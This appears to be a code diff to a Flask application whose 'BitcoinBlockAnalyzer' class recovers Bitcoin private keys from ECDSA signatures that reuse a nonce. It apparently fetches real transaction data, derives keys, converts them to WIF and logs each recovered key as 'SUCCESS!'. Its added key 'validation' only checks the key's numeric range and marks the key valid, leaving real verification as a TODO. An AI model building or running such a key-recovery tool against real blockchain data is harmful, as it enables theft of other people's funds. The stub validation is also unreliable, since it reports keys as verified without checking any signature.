@@ -20,7 +20,6 @@ from flask import Flask, render_template, request, jsonify, flash, redirect, url
 from flask_sqlalchemy import SQLAlchemy
 from werkzeug.middleware.proxy_fix import ProxyFix
 from sqlalchemy import create_engine, Column, Integer, String, DateTime, Text, Float, Boolean
-from sqlalchemy.ext.declarative import declarative_base
 from sqlalchemy.orm import sessionmaker, DeclarativeBase
 from sqlalchemy.exc import SQLAlchemyError
 import base58
@@ -35,7 +34,8 @@ from config import Config
 # Configure logging
 logging.basicConfig(level=logging.DEBUG)
 
-Base = declarative_base()
+class Base(DeclarativeBase):
+    pass
 db = SQLAlchemy()
 
 # Create Flask app
@@ -650,37 +650,6 @@ class BitcoinBlockAnalyzer:
 
         return result
 
-    def _recover_private_key_from_k_reuse(self, r: int, s1: int, s2: int, z1: int, z2: int) -> Optional[str]:
-        """Recover private key from k-reuse vulnerability and return in WIF format"""
-        try:
-            # Calculate k using the k-reuse formula
-            s_diff = (s1 - s2) % self.N
-            z_diff = (z1 - z2) % self.N
-
-            if s_diff == 0:
-                return None
-
-            # Calculate modular inverse of s_diff
-            s_diff_inv = pow(s_diff, self.N - 2, self.N)
-            k = (z_diff * s_diff_inv) % self.N
-
-            if k == 0:
-                return None
-
-            # Calculate private key using: d = (s*k - z) * r^-1 mod n
-            r_inv = pow(r, self.N - 2, self.N)
-            private_key = ((s1 * k - z1) * r_inv) % self.N
-
-            if 0 < private_key < self.N:
-                # Convert to WIF format
-                wif = self._private_key_to_wif(private_key, compressed=True)
-                logging.info(f"Recovered private key from k-reuse: {wif}")
-                return wif
-
-            return None
-        except Exception as e:
-            logging.error(f"Error in k-reuse recovery: {e}")
-            return None
 
     def _recover_from_manual_data(self, r: int, s1: int, s2: int, s3: int, z1: int, z2: int, z3: int) -> Optional[str]:
         """Recover private key from manually provided signature data (like your example)"""
@@ -778,6 +747,83 @@ class BitcoinBlockAnalyzer:
         except Exception as e:
             logging.error(f"Error in private key recovery: {e}")
             return None
+
+    def _recover_private_key_from_k_reuse(self, r: int, s1: int, s2: int, z1: int, z2: int) -> Optional[str]:
+        """Recover private key using two-step ECDSA k-reuse attack algorithm"""
+        try:
+            # Validate inputs
+            if s1 == s2:
+                logging.error("Invalid signatures: s1 equals s2")
+                return None
+            
+            if r == 0:
+                logging.error("Invalid signature: r equals zero")
+                return None
+            
+            # Step 1: Recover nonce k = (z1-z2)/(s1-s2) mod n
+            numerator = (z1 - z2) % self.N
+            denominator = (s1 - s2) % self.N
+            
+            if denominator == 0:
+                logging.error("Invalid signatures: s1-s2 equals zero")
+                return None
+            
+            denominator_inv = pow(denominator, self.N - 2, self.N)  # modular inverse
+            k = (numerator * denominator_inv) % self.N
+            
+            logging.info(f"Step 1 - Recovered nonce k: {hex(k)}")
+            
+            # Step 2: Recover private key d = (s1*k-z1)/r mod n
+            numerator2 = (s1 * k - z1) % self.N
+            r_inv = pow(r, self.N - 2, self.N)  # modular inverse
+            private_key = (numerator2 * r_inv) % self.N
+            
+            logging.info(f"Step 2 - Recovered private key: {hex(private_key)}")
+            
+            # Verify the private key is not zero
+            if private_key == 0:
+                logging.error("Recovered private key is zero")
+                return None
+            
+            # Convert to WIF format
+            wif = self._private_key_to_wif(private_key, compressed=True)
+            logging.critical(f"SUCCESS! Private key recovered from k-reuse: {wif}")
+            return wif
+            
+        except Exception as e:
+            logging.error(f"Error in k-reuse recovery: {e}")
+            return None
+
+    def _validate_recovered_private_key(self, private_key_wif: str, r: int, s: int, z: int) -> Dict[str, Any]:
+        """Validate a recovered private key against original signature components"""
+        try:
+            # Convert WIF back to private key integer
+            private_key_bytes = self._wif_to_private_key_bytes(private_key_wif)
+            private_key_int = int.from_bytes(private_key_bytes, 'big')
+            
+            # Basic validation
+            if not (0 < private_key_int < self.N):
+                return {
+                    'valid': False,
+                    'error': 'Private key out of valid range',
+                    'details': f'Key: {hex(private_key_int)}, Range: (0, {hex(self.N)})'
+                }
+            
+            # TODO: Implement full signature verification
+            # For now, return basic validation result
+            return {
+                'valid': True,
+                'private_key_hex': hex(private_key_int),
+                'validation_method': 'basic_range_check',
+                'details': 'Private key is within valid range for secp256k1'
+            }
+            
+        except Exception as e:
+            return {
+                'valid': False,
+                'error': f'Validation failed: {str(e)}',
+                'details': 'Could not validate private key'
+            }
 
     def _extract_all_signatures_from_tx(self, tx: Dict) -> List[Dict]:
         """Extract all signatures from a transaction using raw transaction parsing"""
@@ -1673,7 +1719,6 @@ def dashboard_stats():
         'autopilot_status': autopilot_state
     })
 
-class BitcoinBlockAnalyzer:
     def _fetch_test_transaction_data(self) -> Dict[str, Any]:
         """Fetch real transaction data with potential k-reuse vulnerability"""
         try:
@@ -1808,8 +1853,8 @@ def test_manual_recovery():
                 sig1 = signatures[i]
                 sig2 = signatures[j]
                 
-                # Attempt private key recovery
-                recovered_key = analyzer._attempt_private_key_recovery(
+                # Attempt private key recovery using k-reuse attack
+                recovered_key = analyzer._recover_private_key_from_k_reuse(
                     r, sig1['s'], sig2['s'], sig1['z'], sig2['z']
                 )
                 
